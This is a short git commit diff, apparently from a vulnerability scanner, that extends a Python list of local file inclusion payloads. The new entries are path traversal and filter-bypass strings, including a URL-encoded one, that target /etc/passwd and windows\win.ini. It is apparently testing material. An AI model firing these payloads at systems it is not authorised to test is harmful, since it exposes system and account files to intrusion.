8c78679f5a03a8c7d30790ddba7a090569fcfe1d
Mrx <143259711+akuajalah01@users.noreply.github.com>
2026-05-13 00:20:32 +0700

    Add additional LFI payloads for testing

--- core/payloads/lfi_payloads.py
+++ core/payloads/lfi_payloads.py
@@ -2,6 +2,11 @@ LFI_PAYLOADS = [
     "../../../../../../etc/passwd",
     "../../../../etc/passwd",
     "../../../etc/passwd",
+    "../../etc/passwd",
+    "../etc/passwd",
+    "....//....//....//etc/passwd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
     "..\\..\\..\\windows\\win.ini",
-    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    "..\\..\\windows\\win.ini",
+    "..\\windows\\win.ini"
 ]
